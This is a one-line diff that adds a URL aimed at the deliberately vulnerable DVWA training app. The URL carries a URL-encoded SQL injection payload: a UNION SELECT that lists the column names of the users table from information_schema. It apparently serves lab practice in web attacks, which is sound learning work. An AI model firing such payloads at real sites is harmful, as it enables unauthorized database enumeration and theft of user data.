@@ -1,0 +1,1 @@
+http://<ip address>/dvwa/vulnerabilities/sqli/?id=tst%27union%20select%201,column_name%20from%20information_schema.columns%20where%20table_name=users%23&Submit=Submit#
